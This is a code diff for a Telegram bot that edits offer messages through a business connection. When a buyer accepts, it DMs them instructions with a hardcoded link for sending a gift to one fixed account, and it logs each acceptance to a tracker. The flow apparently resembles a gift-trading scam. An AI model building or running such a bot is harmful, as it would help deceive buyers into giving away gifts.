@@ -106,7 +106,6 @@ def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
 
 def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
-    # ТВОЯ ССЫЛКА
     gift_url = "tg://send_gift?to=8863549439"
     
     return InlineKeyboardMarkup(
@@ -227,7 +226,7 @@ async def handle_custom_command(message: Message):
         logging.exception("Ошибка в .оффер")
 
 # =====================================
-# КНОПКИ ПРИНЯТИЯ/ОТКЛОНЕНИЯ (С ЗАЩИТОЙ)
+# КНОПКИ ПРИНЯТИЯ/ОТКЛОНЕНИЯ (ИСПРАВЛЕНО)
 # =====================================
 @dp.callback_query(F.data.startswith("acc:"))
 async def cb_accept(call: CallbackQuery):
@@ -248,29 +247,31 @@ async def cb_accept(call: CallbackQuery):
         cur=offer["cur"]
     ) + f"\n\n{offer['url']}"
 
-    # 2. Пытаемся отредактировать
+    # 2. Пытаемся отредактировать сообщение через бизнес-подключение
     try:
-        await call.message.edit_text(
+        await bot.edit_business_message(
+            business_connection_id=call.message.business_connection_id,
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
             text=text,
             reply_markup=instruction_kb(lang),
             link_preview_options=LARGE_PREVIEW
         )
-        logging.info("Сообщение успешно отредактировано.")
+        logging.info("Бизнес-сообщение успешно отредактировано.")
     except Exception as e:
         logging.error(f"Edit error: {e}")
-        # 3. Если редактирование упало - удаляем и шлем новое
-        try:
-            await call.message.delete()
-            await call.bot.send_message(
-                chat_id=call.message.chat.id,
-                text=text,
-                reply_markup=instruction_kb(lang),
-                business_connection_id=call.message.business_connection_id,
-                link_preview_options=LARGE_PREVIEW
-            )
-            logging.info("Сообщение заменено новым.")
-        except Exception as e2:
-            logging.error(f"Fallback error: {e2}")
+
+    # 3. ВСЕГДА шлём отдельное сообщение принявшему (в его ЛС с ботом)
+    try:
+        await bot.send_message(
+            chat_id=call.from_user.id,
+            text=text,
+            reply_markup=instruction_kb(lang),
+            link_preview_options=LARGE_PREVIEW
+        )
+        logging.info("Сообщение отправлено в ЛС покупателю.")
+    except Exception as e:
+        logging.error(f"Send to buyer error: {e}")
 
     # 4. Лог в трекер (в фоне)
     asyncio.create_task(tracker_log(
@@ -290,7 +291,13 @@ async def cb_decline(call: CallbackQuery):
     t = TEXTS.get(lang, TEXTS["ru"])
 
     try:
-        await call.message.edit_text(text=t["declined"], reply_markup=None)
+        await bot.edit_business_message(
+            business_connection_id=call.message.business_connection_id,
+            chat_id=call.message.chat.id,
+            message_id=call.message.message_id,
+            text=t["declined"],
+            reply_markup=None
+        )
     except TelegramBadRequest:
         pass
 
